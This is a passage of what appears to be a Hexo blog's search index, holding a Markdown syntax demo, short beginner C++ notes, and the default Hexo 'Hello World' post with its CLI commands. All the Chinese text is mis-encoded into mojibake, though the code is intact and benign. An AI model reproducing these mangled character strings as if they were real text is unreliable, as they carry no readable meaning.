å–æ¶ˆç¼©è¿›è¿”å›ä¸Šä¸€çº§ã€‚</p></blockquote><h3 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h3><blockquote><p>å¼•ç”¨</p></blockquote><p><code>&gt; è¿™æ˜¯å¼•ç”¨</code></p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>è¿™æ˜¯è¡Œå†…<code>ä»£ç </code></p><p><code>è¿™æ˜¯è¡Œå†…ä»£ç </code></p><h4 id="ä»£ç å—"><a href="#ä»£ç å—" class="headerlink" title="ä»£ç å—"></a>ä»£ç å—</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">"hello world"</span> &lt;&lt; endl;</span><br></pre></td></tr></tbody></table></figure><h3 id="åˆ†å‰²çº¿"><a href="#åˆ†å‰²çº¿" class="headerlink" title="åˆ†å‰²çº¿"></a>åˆ†å‰²çº¿</h3><hr><hr><h3 id="è¶…é“¾æ¥"><a href="#è¶…é“¾æ¥" class="headerlink" title="è¶…é“¾æ¥"></a>è¶…é“¾æ¥</h3><ol><li>é“¾æ¥åˆ°ç½‘ç«™<br><a href="https://ygkldnherr.github.io/">æˆ‘çš„å°ç«™</a> <code>[æˆ‘çš„å°ç«™](https://ygkldnherr.github.io)</code></li><li>è¿æ¥åˆ°å…¶ä»–Markdowné¡µé¢<br><a href="./hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world)</code></li><li>æ— æ ‡ç­¾é“¾æ¥<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>&lt;https://ygkldnherr.github.io&gt;</code></li><li>æ— æ ‡ç­¾é‚®ç®±é“¾æ¥<br><a href="mailto:ygkldnherr@gmail.com">ygkldnherr@gmail.com</a> <code>&lt;ygkldnherr@gmail.com&gt;</code></li><li>æ·»åŠ title<br><a href="./hello-world" title="ç‚¹å‡»è·³è½¬åˆ°hello-world">Markdown hello-world</a> <code>[Markdown hello-world](./hello-world "ç‚¹å‡»è·³è½¬åˆ°hello-world")</code></li><li>è‡ªåŠ¨è¶…é“¾æ¥<br><a href="https://ygkldnherr.github.io/">https://ygkldnherr.github.io</a> <code>https://ygkldnherr.github.io</code></li></ol><h3 id="å›¾ç‰‡"><a href="#å›¾ç‰‡" class="headerlink" title="å›¾ç‰‡"></a>å›¾ç‰‡</h3><ol><li>æ·»åŠ ä¸€ä¸ªå›¾ç‰‡<br><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡"></li><li>å¸¦é“¾æ¥çš„å›¾ç‰‡<br><a href="https://ygkldnherr.github.io/"><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡"></a></li><li>å¸¦titleçš„å›¾ç‰‡<br><img src="/2023/11/12/my-first-blog-about-MD/Snipaste.png" alt="è¿™æ˜¯ä¸€ä¸ªå›¾ç‰‡" title="è¿™æ˜¯ä¸€ä¸ªæˆªå›¾"></li></ol><h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><p>ä¸¤ç§æ–¹æ³•ï¼šä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥è¾“å…¥ï¼Œå¦ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨è¡¨æƒ…çŸ­ç ï¼ˆåˆ©ç”¨ä¸¤ä¸ªå†’å·éš”å¼€ï¼‰<br><span class="github-emoji"><span>ğŸ˜‚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>:joy:</code></p><h3 id="å†…åµŒHTML"><a href="#å†…åµŒHTML" class="headerlink" title="å†…åµŒHTML"></a>å†…åµŒHTML</h3><h3 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h3><table><thead><tr><th align="center">ç¬¬ä¸€åˆ—</th><th align="center">ç¬¬äºŒåˆ—</th><th align="center">ç¬¬ä¸‰åˆ—</th></tr></thead><tbody><tr><td align="center">ç¬¬ä¸€åˆ—ç¬¬ä¸€åˆ—</td><td align="center">ç¬¬äºŒåˆ—ç¬¬äºŒåˆ—</td><td align="center">ç¬¬ä¸‰åˆ—ç¬¬ä¸‰åˆ—</td></tr></tbody></table><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|ç¬¬ä¸€åˆ—|ç¬¬äºŒåˆ—|ç¬¬ä¸‰åˆ—|</span><br><span class="line">|:---|:---:|---:|</span><br><span class="line">|è¿™æ˜¯å·¦å¯¹é½|è¿™æ˜¯å±…ä¸­å¯¹é½|è¿™æ˜¯å³å¯¹é½|</span><br></pre></td></tr></tbody></table></figure><h3 id="è„šæ³¨"><a href="#è„šæ³¨" class="headerlink" title="è„šæ³¨"></a>è„šæ³¨</h3><p>å¼•ç”¨è¯­æ³•ä¸º<code>[^åç§°]</code><br>å®šä¹‰è¯­æ³•ä¸º<code>[^åç§°]: å†…å®¹</code></p><blockquote><p>è„šæ³¨ä¹Ÿå¯ä»¥ä½œä¸ºå¸¸é‡æ¥ä½¿ç”¨ï¼Œå¦‚å½“å›¾ç‰‡åå¤ªé•¿æ—¶å¯ä»¥ç”¨è„šæ³¨æ¥ä»£æ›¿ã€‚</p></blockquote><h3 id="å…¬å¼"><a href="#å…¬å¼" class="headerlink" title="å…¬å¼"></a>å…¬å¼</h3><p>è¿™æ˜¯ä¸€ä¸ªå…¬å¼$ c^2 = a^2 + b^2 $<br>$$<br>c^2 = a^2 + b^2<br>$$</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Some_c++_knowledge_points</title>
      <link href="/2023/11/09/Some-c-knowledge-points/"/>
      <url>/2023/11/09/Some-c-knowledge-points/</url>
      
        <content type="html"><![CDATA[<p>åœ¨åšé¢˜çš„æ—¶å€™ä¼šæ¥è§¦åˆ°ä¸€äº›é›¶ç¢çš„çŸ¥è¯†ç‚¹ï¼ˆä½œä¸ºä¸€ä¸ªå°ç™½ï¼‰ï¼Œè®°å½•é˜²å¿˜ã€‚<span id="more"></span></p><ol><li><p>æœ‰æ—¶ä¼šæ ¹æ®æŸäº›è§„å¾‹å®šé‡è¾“å‡ºä¸€å®šæ•°é‡çš„ç©ºæ ¼</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%*s"</span>, i, <span class="string">" "</span>);<span class="comment">//*æ˜¯å ä½ï¼ŒæŒ‡çš„æ˜¯iä»£è¡¨çš„åŸŸå®½ã€‚</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Initialized string: %.*s\n"</span>, <span class="built_in">sizeof</span>(str), str);</span><br></pre></td></tr></tbody></table></figure></li><li><p>åŸºäºèŒƒå›´çš„forå¾ªç¯</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = {<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>};</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> e : arr)</span><br><span class="line">{</span><br><span class="line">cout &lt;&lt; e &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>åä¸‰è§’å‡½æ•°</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/05/hello-world/"/>
      <url>/2023/11/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.<span id="more"></span></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
